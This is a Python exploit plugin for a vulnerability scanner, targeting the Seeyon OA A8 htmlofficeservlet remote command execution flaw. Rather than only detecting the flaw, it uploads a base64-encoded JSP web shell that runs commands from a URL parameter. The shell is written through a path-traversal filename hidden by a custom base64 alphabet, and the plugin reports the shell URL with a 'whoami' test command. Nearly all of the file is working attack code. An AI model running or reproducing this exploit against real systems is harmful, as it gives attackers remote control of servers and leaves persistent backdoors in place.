#!/usr/bin/env python3
# @Time    : 2020-04-26
# @Author  : caicai
# @File    : __poc_seeyou_a8_getshell_2019.py
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.helper.helper_socket import socket_send_withssl, socket_send  # 如果需要，socket的方法封装
from myscan.config import scan_set
from myscan.lib.core.common import get_random_str
import base64

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "seeyou_a8_getshell"
        self.vulmsg = "致远OA-A8系统存在远程命令执行漏洞,see it :https://www.cnvd.org.cn/webinfo/show/5095"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url + "seeyon/htmlofficeservlet",
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects": False
        }
        r=request(**req)
        if r!=None and b"DBSTEP" in r.content:
            random_str=get_random_str(5)+".jspx"
            req["method"]="POST"
            req["data"]=self.generate_payload(random_str)
            r1=request(**req)
            if r1!=None and b"java" in r1.content:
                parser_=response_parser(r1)
                self.result.append({
                    "name": self.name,
                    "url": parser_.geturl(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "shell":self.url + "seeyon/{}?cmd=whoami".format(random_str),
                        "request":parser_.getrequestraw(),
                        "response":parser_.getresponseraw()
                    }
                })
    def generate_payload(self,filename):
        a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        b = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
        data=base64.b64decode("REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkblJXQWVheVFkSHpqY0F1aHFSamlkZzY2DQpuZWVkUmVhZEZpbGU9eVJXWmRBUzYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13TFNHUDRvRXpMS0F6ND1pej02Ng0KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+IDwlIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7IFN0cmluZyBvdXRwdXQgPSAiIjsgaWYoY21kICE9IG51bGwpIHsgU3RyaW5nIHMgPSBudWxsOyB0cnkgeyBQcm9jZXNzIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCk7IEJ1ZmZlcmVkUmVhZGVyIHNJID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihwLmdldElucHV0U3RyZWFtKCkpKTsgd2hpbGUoKHMgPSBzSS5yZWFkTGluZSgpKSAhPSBudWxsKSB7IG91dHB1dCArPSBzICsiXHJcbiI7IH0gfSBjYXRjaChJT0V4Y2VwdGlvbiBlKSB7IGUucHJpbnRTdGFja1RyYWNlKCk7IH0gfW91dC5wcmludGxuKG91dHB1dCk7JT4NCg==").decode()
        encstr = r"..\..\..\ApacheJetspeed\webapps\seeyon\{}".format(filename)
        out = ""
        s = base64.b64encode(encstr.encode()).decode()
        for i in s:
            out += b[a.index(i)]
        return data.replace("qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdnRWAeayQdHzjcAuhqRjidg66",out)